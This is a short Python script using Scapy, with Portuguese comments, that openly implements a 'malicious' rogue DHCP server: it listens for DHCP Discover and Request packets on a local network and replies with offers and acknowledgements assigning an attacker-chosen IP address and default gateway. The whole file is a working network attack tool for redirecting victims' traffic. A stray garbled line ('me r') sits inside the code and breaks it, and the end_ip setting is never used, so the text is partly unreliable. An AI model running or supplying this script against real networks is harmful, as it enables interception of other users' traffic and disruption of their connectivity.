from scapy.all import *

def malicious_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router):
    def dhcp_server(pkt):
        if pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            print(f"Received DHCP Discover from {pkt[Ether].src}")
            dhcp_offer = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / \
                         IP(src=server_ip, dst="255.255.255.255") / \
                         UDP(sport=67, dport=68) / \
                         BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                         DHCP(options=[("message-type", "offer"), ("subnet_mask", subnet_mask), ("router", router), ("end")])
            sendp(dhcp_offer, iface=interface, verbose=0)

        elif pkt[DHCP].options[0][1] == 3:  # DHCP Request
            print(f"Received DHCP Request from {pkt[Ether].src}")
            dhcp_ack = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src=server_ip, dst="255.255.255.255") / \
                       UDP(sport=67, dport=68) / \
                       BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                       DHCP(options=[("message-type", "ack"), ("subnet_mask", subnet_mask), ("router", router), ("end")])
            sendp(dhcp_ack, iface=interface, verbose=0)
me r
    sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=interface)

if __name__ == "__main__":
    interface = "eth0"   # Interface de rede a ser usada para o servidor DHCP malicioso
    server_ip = "192.168.0.6"  # Endereço IP do servidor DHCP malicioso
    start_ip = "192.168.0.100"  # Primeiro IP a ser oferecido
    end_ip = "192.168.0.200"  # Último IP a ser oferecido
    subnet_mask = "255.255.255.0"  # Máscara de sub-rede
    router = "192.168.0.1"  # Gateway padrão

    malicious_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router)
